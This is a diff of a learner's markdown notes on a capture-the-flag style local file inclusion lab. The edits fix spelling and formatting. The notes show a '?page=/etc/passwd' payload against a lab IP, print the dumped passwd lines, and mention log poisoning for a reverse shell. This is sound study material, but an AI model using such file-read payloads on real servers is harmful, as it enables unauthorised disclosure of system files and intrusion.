@@ -3,32 +3,32 @@
 
 ### what is LFI??
 
-- Local file inclusion is a vlulnerability an attacker can exploit to include and read files they are not supposed to leading to them discovering more ways to harm the system.
+- Local file inclusion is a vulnerability which an attacker can exploit to include and read files they are not supposed to leading to them discovering ways to harm the system.
 
-- This is another issue blinding trusting user input. This attack is mostly performed on php backends as they have the include statement. This include statement can be fed very malicious code which it will also execute.
+- This is another issue of blinding trusting user input. This attack is mostly performed on php backends as they have the include statement. This include statement can be fed very malicious code which it will also execute.
 
 -This could resut in..
-	1. Denial of service attack.	
-	2. Remote code execution on the server.
-	3. Sensitive Information Disclosure.
+1. Denial of service attack.	
+2. Remote code execution on the server.
+3. Sensitive Information Disclosure.
 
 ### Task 1 - Local File Inclusion
 
-```
+```text
 export IP=10.10.195.25
 ```
 
 - Accessed the web server on the ip and did my first local file inclusion exploit.
 
 - Added this query at the end of the url of the vulnerable webapp 
-```
+```text
 ?page=home.html 
 
 ?page=/etc/passwd
 ```
 
 - /etc/passwd file as read from the server
-```
+```text
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
@@ -91,4 +91,4 @@ lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash
 
 - Log poisoning from what i'm reading online is trying to get a reverse shell on the server by injecting malicious code into the server logs through lfi. [further-reading](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
 
-- The room guide asks to fire up burpsuite and since i havent used it before, i'll fire up python for this task.
+- The room guide asks to fire up burpsuite and since I have not used it before, i'll just fire up python for this task. Doing a little script to send the request to the website and return the response html code.
